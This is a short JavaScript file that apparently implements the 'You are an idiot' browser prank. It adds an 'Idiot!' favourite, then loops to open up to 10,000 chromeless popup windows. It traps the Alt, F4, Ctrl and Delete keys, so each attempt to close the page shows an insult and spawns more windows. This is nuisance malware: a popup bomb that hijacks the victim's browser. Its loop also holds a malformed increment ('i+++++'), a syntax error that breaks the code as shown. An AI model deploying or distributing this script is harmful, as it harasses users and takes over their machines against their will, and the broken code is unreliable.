function bookmark() {
		if ((navigator.appName == "Microsoft Internet Explorer") 
		&& (parseInt(navigator.appVersion) >= 4)) 
		{
		var url="idiot.html";
		var title="Idiot!";
		window.external.AddFavorite(url,title);
		}
		}



function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function procreate() {
	changeTitle("Idiot!");
	for (var i = 0; i < 10000; i+++++) {
		openWindow('game.html');
	}
}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
function ctrlkey() { if (event.keyCode == 17) { alert("You are an idiot!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }

